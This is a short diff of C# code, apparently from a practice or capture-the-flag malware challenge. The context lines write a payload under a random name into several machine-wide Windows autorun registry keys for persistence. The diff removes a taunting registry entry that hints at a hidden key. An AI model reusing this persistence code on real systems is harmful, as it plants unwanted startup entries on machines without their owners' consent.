@@ -36,8 +36,6 @@ namespace ezclap
             Utils.setHKLMSubKey(RegistryKeys.RunServices, names[rndNameIdx], payload);
             Utils.setHKLMSubKey(RegistryKeys.RunServicesOnce, names[rndNameIdx], payload);
             Utils.setHKLMSubKey(RegistryKeys.RunOnceEx, names[rndNameIdx], payload);
-
-            Utils.setHKLMSubKey(RegistryKeys.RunKey, "Good job you have found something", "There is a hidden key as well. Try to find that! That is why the error message is showing up.");
             
         } 
 
